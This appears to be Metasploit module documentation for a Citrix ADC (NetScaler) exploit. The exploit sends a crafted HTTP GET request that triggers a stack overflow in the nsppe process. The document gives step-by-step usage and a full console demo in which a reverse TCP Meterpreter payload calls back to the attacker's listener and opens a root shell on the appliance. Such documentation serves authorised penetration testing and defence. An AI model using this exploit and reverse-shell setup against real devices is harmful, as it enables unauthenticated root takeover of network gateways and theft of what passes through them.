## Vulnerable Application

A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of
the nsppe process by making a specially crafted HTTP GET request. Successful exploitation results in remote code
execution as root.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/freebsd/http/citrix_formssso_target_rce`
4. Set the `RHOST`, `PAYLOAD` and payload-related options
5. Do: `run`
6. You should get a shell.

## Options

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### Citrix ADC 13.1-48.47

NetScaler VPX instance for VMware ESX from `NSVPX-ESX-13.1-48.47_nc_64`.

```
msf6 exploit(freebsd/http/citrix_formssso_target_rce) > show options 

Module options (exploit/freebsd/http/citrix_formssso_target_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.159.130  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Citrix ADC 13.1-48.47



View the full module info with the info, or info -d command.

msf6 exploit(freebsd/http/citrix_formssso_target_rce) > run

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Sending stage (24768 bytes) to 192.168.159.30
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.30:36429) at 2023-07-31 17:34:18 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : cirtrix
OS           : FreeBSD 11.4-NETSCALER-13.1 FreeBSD 11.4-NETSCALER-13.1 #0 2596b10c4(rs_131_48_41_RTM): Sat Jun  3 00:57:48 PDT 2023     root@sjc-bld-bsd114-232:/usr/obj/usr/home/build/adc/usr.src/sys/NS64
Architecture : x64
Meterpreter  : python/freebsd
meterpreter > pwd
/
meterpreter > 
```
